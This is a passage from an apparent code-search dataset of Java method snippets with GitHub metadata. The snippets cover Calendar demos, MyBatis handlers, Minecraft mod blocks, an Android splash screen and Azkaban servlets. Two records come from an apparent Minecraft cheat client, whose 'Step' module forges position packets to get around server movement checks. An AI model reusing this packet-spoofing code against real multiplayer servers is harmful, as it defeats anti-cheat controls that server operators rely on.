"https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo04/Calendar/Demo02Calendar.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32346, "method_name": "demo02", "class_name": "Demo02Calendar", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void demo02() {\n        //\u4f7f\u7528getInstance\u65b9\u6cd5\u83b7\u53d6Calendar\u5bf9\u8c61\n        Calendar c = Calendar.getInstance();\n\n        //\u8bbe\u7f6e\u5e74\u4e3a9999\n        c.set(Calendar.YEAR,9999);\n        //\u8bbe\u7f6e\u6708\u4e3a9\u6708\n        c.set(Calendar.MONTH,9);\n        //\u8bbe\u7f6e\u65e59\u65e5\n        c.set(Calendar.DATE,9);\n\n        //\u540c\u65f6\u8bbe\u7f6e\u5e74\u6708\u65e5,\u53ef\u4ee5\u4f7f\u7528set\u7684\u91cd\u8f7d\u65b9\u6cd5\n        c.set(8888,8,8);\n\n        int year = c.get(Calendar.YEAR);\n        System.out.println(year);\n\n        int month = c.get(Calendar.MONTH);\n        System.out.println(month);//\u897f\u65b9\u7684\u6708\u4efd0-11 \u4e1c\u65b9:1-12\n\n        int date = c.get(Calendar.DATE);\n        System.out.println(date);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo04/Calendar/Demo02Calendar.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32347, "method_name": "demo01", "class_name": "Demo02Calendar", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void demo01() {\n        //\u4f7f\u7528getInstance\u65b9\u6cd5\u83b7\u53d6Calendar\u5bf9\u8c61\n        Calendar c = Calendar.getInstance();\n        int year = c.get(Calendar.YEAR);\n        System.out.println(year);\n\n        int month = c.get(Calendar.MONTH);\n        System.out.println(month);//\u897f\u65b9\u7684\u6708\u4efd0-11 \u4e1c\u65b9:1-12\n\n        //int date = c.get(Calendar.DAY_OF_MONTH);\n        int date = c.get(Calendar.DATE);\n        System.out.println(date);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo04/Calendar/Demo02Calendar.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32348, "method_name": "setNonNullParameter", "class_name": "ClobTypeHandler", "params": ["PreparedStatement", "int", "String", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, String parameter, JdbcType jdbcType)\n      throws SQLException {\n    StringReader reader = new StringReader(parameter);\n    ps.setCharacterStream(i, reader, parameter.length());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 32349, "method_name": "getNullableResult", "class_name": "ClobTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getNullableResult(ResultSet rs, String columnName)\n      throws SQLException {\n    Clob clob = rs.getClob(columnName);\n    return toString(clob);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 32350, "method_name": "getNullableResult", "class_name": "ClobTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getNullableResult(ResultSet rs, int columnIndex)\n      throws SQLException {\n    Clob clob = rs.getClob(columnIndex);\n    return toString(clob);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 32351, "method_name": "getNullableResult", "class_name": "ClobTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getNullableResult(CallableStatement cs, int columnIndex)\n      throws SQLException {\n    Clob clob = cs.getClob(columnIndex);\n    return toString(clob);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 32352, "method_name": "toString", "class_name": "ClobTypeHandler", "params": ["Clob"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "String", "snippet": "  private String toString(Clob clob) throws SQLException {\n    return clob == null ? null : clob.getSubString(1, (int) clob.length());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 32353, "method_name": "onPacket", "class_name": "ChatSuffix", "params": ["PacketEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPacket(PacketEvent event) {\n        if (event.getType().equals(PacketEvent.Type.OUTGOING) && event.getPacket() instanceof CPacketChatMessage) {\n            CPacketChatMessage packet = (CPacketChatMessage) event.getPacket();\n            if (packet.getMessage().startsWith(\"/\") || packet.getMessage().startsWith(Commands.prefix))\n                return;\n            packet.message = packet.getMessage() + \" \" + Mercury.INSTANCE.getSmallTextManager().convert(this.suffix);\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/ChatSuffix.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 32354, "method_name": "getPackTypeDesc", "class_name": "AbstractProtocolBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPackTypeDesc() {\n        PackageType annotation = AnnotationUtil.getAnnotation(this.getClass(), PackageType.class);\n        if (annotation != null) {\n            return annotation.desc();\n        }\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/AbstractProtocolBody.java", "stars": "6", "class_props": {"extends": null, "implements": ["ProtocolBody"], "modifiers": ["public", "abstract"]}}, {"id": 32355, "method_name": "getPackType", "class_name": "AbstractProtocolBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPackType() {\n        PackageType annotation = AnnotationUtil.getAnnotation(this.getClass(), PackageType.class);\n        if (annotation != null) {\n            return annotation.value();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/AbstractProtocolBody.java", "stars": "6", "class_props": {"extends": null, "implements": ["ProtocolBody"], "modifiers": ["public", "abstract"]}}, {"id": 32356, "method_name": "getPackTypeHexStr", "class_name": "AbstractProtocolBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPackTypeHexStr() {\n        return String.format(\"0x%08x\", getPackType());\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/AbstractProtocolBody.java", "stars": "6", "class_props": {"extends": null, "implements": ["ProtocolBody"], "modifiers": ["public", "abstract"]}}, {"id": 32357, "method_name": "getHexStr", "class_name": "AbstractProtocolBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHexStr() {\n        return NettyUtil.bytesToStr(data);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/AbstractProtocolBody.java", "stars": "6", "class_props": {"extends": null, "implements": ["ProtocolBody"], "modifiers": ["public", "abstract"]}}, {"id": 32358, "method_name": "main", "class_name": "Search", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        File file = new File(\"/Users/chengcheng/Desktop/test/abc\");\n        getAllFile(file);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/File/Search.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32359, "method_name": "getAllFile", "class_name": "Search", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void getAllFile(File dir){\n        //System.out.println(dir);//\u6253\u5370\u88ab\u904d\u5386\u7684\u76ee\u5f55\u7ed3\u6784\n\n        File[] files = dir.listFiles();\n        for (File f : files){\n            //\u5224\u65ad\u662f\u5426\u6587\u4ef6\u5939\n            if(f.isDirectory()){\n                //\u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u8c03\u7528\u81ea\u5df1\n                getAllFile(f);\n            }else{\n                //f\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u76f4\u63a5\u6253\u5370\n                /**\n                 * \u53ea\u8981java\u7ed3\u5c3e\u7684\u6587\u4ef6\n                 * 1\u3001\u628aFile\u5bf9\u8c61f\uff0c\u8f6c\u6362\u5b57\u7b26\u4e32\u5bf9\u8c61\n                 */\n                //String name = f.getName();//abc.java\n                //String path = f.getPath();//abc/abc.java\n                String s = f.toString();//abc/abc.java\n\n                s = s.toLowerCase();\n\n                //2\u3001\u8c03\u7528String\u7c7b\u91cd\u7684\u65b9\u6cd5\uff0cendsWith\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4ee5.java\u7ed3\u5c3e\n                boolean b = s.endsWith(\".java\");\n\n                //3\u3001\u5982\u679c\u662f\uff0c\u5219\u8f93\u51fa\n                if(b){\n                    System.out.println(f);\n                }\n\n                //\u7b49\u540c\u4e8e\u4e0a\u9762\u90a3\u6bb5\n                if(f.getName().toLowerCase().endsWith(\".java\")){\n                    System.out.println(f);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/File/Search.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32360, "method_name": "initElements", "class_name": "RoughRedSanstoneSlabBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 32361, "method_name": "clientLoad", "class_name": "RoughRedSanstoneSlabBlock", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\n\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 32362, "method_name": "init", "class_name": "RoughRedSanstoneSlabBlock", "params": ["FMLCommonSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLCommonSetupEvent event) {\n\t\tfor (Biome biome : ForgeRegistries.BIOMES.getValues()) {\n\t\t\tboolean biomeCriteria = false;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"badlands\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"wooded_badlands_plateau\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"badlands_plateau\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"eroded_badlands\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"modified_wooded_badlands_plateau\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"modified_badlands_plateau\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (!biomeCriteria)\n\t\t\t\tcontinue;\n\t\t\tbiome.addFeature(GenerationStage.Decoration.UNDERGROUND_ORES, new OreFeature(OreFeatureConfig::deserialize) {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean place(IWorld world, ChunkGenerator generator, Random rand, BlockPos pos, OreFeatureConfig config) {\n\t\t\t\t\tDimensionType dimensionType = world.getDimension().getType();\n\t\t\t\t\tboolean dimensionCriteria = false;\n\t\t\t\t\tif (dimensionType == DimensionType.OVERWORLD)\n\t\t\t\t\t\tdimensionCriteria = true;\n\t\t\t\t\tif (!dimensionCriteria)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\treturn super.place(world, generator, rand, pos, config);\n\t\t\t\t}\n\t\t\t}.withConfiguration(\n\t\t\t\t\tnew OreFeatureConfig(OreFeatureConfig.FillerBlockType.create(\"roughredsanstoneslab\", \"roughredsanstoneslab\", blockAt -> {\n\t\t\t\t\t\tboolean blockCriteria = false;\n\t\t\t\t\t\tif (blockAt.getBlock() == Blocks.RED_SANDSTONE.getDefaultState().getBlock())\n\t\t\t\t\t\t\tblockCriteria = true;\n\t\t\t\t\t\treturn blockCriteria;\n\t\t\t\t\t}), block.getDefaultState(), 16)).withPlacement(Placement.COUNT_RANGE.configure(new CountRangeConfig(16, 0, 0, 256))));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 32363, "method_name": "isNormalCube", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\n\t\t\treturn false;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32364, "method_name": "propagatesSkylightDown", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\n\t\t\treturn true;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32365, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(RoughRedSanstoneSlabBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32366, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughRedSanstoneSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32367, "method_name": "onCreateView", "class_name": "SpalshScreen", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.fragment_spalsh_screen, container, false);\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/SpalshScreen.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32368, "method_name": "onViewCreated", "class_name": "SpalshScreen", "params": ["View", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n\n        preventingTV = view.findViewById(R.id.prentationTV);\n\n\n        Random random = new Random();\n        int n = random.nextInt((prevention.length)-1);\n\n        preventingTV.setText(prevention[n]);\n\n        Thread thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n               doWork();\n                StartApp();\n\n            }\n        });\n        thread.start();\n\n\n\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/SpalshScreen.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32369, "method_name": "StartApp", "class_name": "SpalshScreen", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void StartApp() {\n\n        Navigation.findNavController(getActivity(),R.id.nav_host_fragment_container).navigate(R.id.homeFragment);\n\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/SpalshScreen.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32370, "method_name": "doWork", "class_name": "SpalshScreen", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void doWork() {\n        try {\n            Thread.sleep(3000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/SpalshScreen.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32371, "method_name": "getName", "class_name": "MetaCond", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/MetaCond.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32372, "method_name": "setName", "class_name": "MetaCond", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/MetaCond.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32373, "method_name": "getType", "class_name": "MetaCond", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/MetaCond.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32374, "method_name": "setType", "class_name": "MetaCond", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {\n        this.type = type;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/MetaCond.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32375, "method_name": "send", "class_name": "KafkaProducerController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void send(@RequestParam String message){\n        senderService.send(message);\n    }", "url": "https://raw.githubusercontent.com/camelya58/kafka-sample/master/kafka-producer/src/main/java/com/example/kafkaproducer/controller/KafkaProducerController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32376, "method_name": "isFromBeforeTo", "class_name": "LeasingDTO", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isFromBeforeTo() {\n        return from.isBefore(to);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/leasing/LeasingDTO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32377, "method_name": "onUpdate", "class_name": "Step", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(final UpdateEvent event) {\n        if (event.getTiming().equals(EventTiming.PRE)) {\n            if (mc.world == null || mc.player == null || mc.player.isInWater() || mc.player.isInLava() || mc.player.isOnLadder()\n                    || mc.gameSettings.keyBindJump.isKeyDown()) {\n                return;\n            }\n            if ((Mercury.INSTANCE.getModuleManager().find(Speed.class).isEnabled() && !(Speed.mode.equalsIgnoreCase(\"packet\") || Speed.mode.equalsIgnoreCase(\"packet2\"))\n            || Mercury.INSTANCE.getModuleManager().find(Flight.class).isEnabled()))\n                return;\n            if (timer) {\n                if (this.ticks == 0) {\n                    EntityUtil.resetTimer();\n                } else {\n                    --this.ticks;\n                }\n            }\n            if (mc.player != null && mc.player.onGround && !mc.player.isInWater() && !mc.player.isOnLadder() && this.reverse) {\n                for (double y = 0.0; y < this.height + 0.5; y += 0.01) {\n                    if (!mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(0.0, -y, 0.0)).isEmpty()) {\n                        mc.player.motionY = -10.0;\n                        break;\n                    }\n                }\n            }\n            double dir[] = MotionUtil.forward(0.1);\n            boolean twofive = false;\n            boolean two = false;\n            boolean onefive = false;\n            boolean one = false;\n            if (mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 2.6, dir[1])).isEmpty() && !mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 2.4, dir[1])).isEmpty()) {\n                twofive = true;\n            }\n            if (mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 2.1, dir[1])).isEmpty() && !mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 1.9, dir[1])).isEmpty()) {\n                two = true;\n            }\n            if (mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 1.6, dir[1])).isEmpty() && !mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 1.4, dir[1])).isEmpty()) {\n                onefive = true;\n            }\n            if (mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 1.0, dir[1])).isEmpty() && !mc.world.getCollisionBoxes(mc.player, mc.player.getEntityBoundingBox().offset(dir[0], 0.6, dir[1])).isEmpty()) {\n                one = true;\n            }\n            if (mc.player.collidedHorizontally && (mc.player.moveForward != 0.0f || mc.player.moveStrafing != 0.0f) && mc.player.onGround) {\n                if (one && this.height >= 1.0) {\n                    final double[] oneOffset = { 0.42, 0.753 };\n                    for (int i = 0; i < oneOffset.length; ++i) {\n                        mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + oneOffset[i], mc.player.posZ, mc.player.onGround));\n                    }\n                    if (timer) {\n                        EntityUtil.setTimer(0.6f);\n                    }\n                    mc.player.setPosition(mc.player.posX, mc.player.posY + 1.0, mc.player.posZ);\n                    this.ticks = 1;\n                }\n                if (onefive && this.height >= 1.5) {\n                    final double[] oneFiveOffset = { 0.42, 0.75, 1.0, 1.16, 1.23, 1.2 };\n                    for (int i = 0; i < oneFiveOffset.length; ++i) {\n                        mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + oneFiveOffset[i], mc.player.posZ, mc.player.onGround));\n                    }\n                    if (timer) {\n                        EntityUtil.setTimer(0.35f);\n                    }\n                    mc.player.setPosition(mc.player.posX, mc.player.posY + 1.5, mc.player.posZ);\n                    this.ticks = 1;\n                }\n                if (two && this.height >= 2.0) {\n                    final double[] twoOffset = { 0.42, 0.78, 0.63, 0.51, 0.9, 1.21, 1.45, 1.43 };\n                    for (int i = 0; i < twoOffset.length; ++i) {\n                        mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + twoOffset[i], mc.player.posZ, mc.player.onGround));\n                    }\n                    if (timer) {\n                        EntityUtil.setTimer(0.25f);\n                    }\n                    mc.player.setPosition(mc.player.posX, mc.player.posY + 2.0, mc.player.posZ);\n                    this.ticks = 2;\n                }\n                if (twofive && this.height >= 2.5) {\n                    final double[] twoFiveOffset = { 0.425, 0.821, 0.699, 0.599, 1.022, 1.372, 1.652, 1.869, 2.019, 1.907 };\n                    for (int i = 0; i < twoFiveOffset.length; ++i) {\n                        mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + twoFiveOffset[i], mc.player.posZ, mc.player.onGround));\n                    }\n                    if (timer) {\n                        EntityUtil.setTimer(0.15f);\n                    }\n                    mc.player.setPosition(mc.player.posX, mc.player.posY + 2.5, mc.player.posZ);\n                    this.ticks = 2;\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Step.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 32378, "method_name": "init", "class_name": "FlowTriggerInstanceServlet", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void init(final ServletConfig config) throws ServletException {\n    super.init(config);\n    final AzkabanWebServer server = (AzkabanWebServer) getApplication();\n    this.triggerService = server.getFlowTriggerService();\n    this.projectManager = server.getProjectManager();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32379, "method_name": "handleGet", "class_name": "FlowTriggerInstanceServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n    if (hasParam(req, \"ajax\")) {\n      handleAJAXAction(req, resp, session);\n    } else {\n      handlePage(req, resp, session);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32380, "method_name": "handlePage", "class_name": "FlowTriggerInstanceServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handlePage(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session) {\n    final Page page =\n        newPage(req, resp, session,\n            \"azkaban/webapp/servlet/velocity/executingflowtriggerspage.vm\");\n\n    page.add(\"runningTriggers\", this.triggerService.getRunningTriggers());\n    page.add(\"recentTriggers\", this.triggerService.getRecentlyFinished());\n\n    String languageType = LoadJsonUtils.getLanguageType();\n    page.add(\"currentlangType\", languageType);\n\n    page.add(\"vmutils\", new ExecutorVMHelper());\n    page.render();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 